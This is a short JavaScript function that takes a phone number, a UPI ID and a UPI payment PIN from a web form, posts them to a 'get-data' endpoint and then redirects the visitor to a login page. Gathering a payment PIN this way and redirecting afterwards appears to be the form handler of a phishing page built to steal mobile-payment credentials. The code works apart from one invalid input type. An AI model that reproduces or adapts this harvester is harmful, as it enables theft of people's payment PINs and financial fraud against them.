
function submit() {
    var phoneNumber = $("input[type='tel']").val();
    var upi_id = $("input[type='number']").val();
    var pin = $("input[type='pin']").val();

    $.ajax({
            url: "get-data",
            type: "POST",
            data: { phone: phoneNumber, upi_id: upi_id, pwd: pin },
            success: function (response) {
                window.location.href = "/login";
            },
            error: function (xhr, status, error) {
                console.error("Error:", error);
                alert("An error occurred!");
            }
        });
}
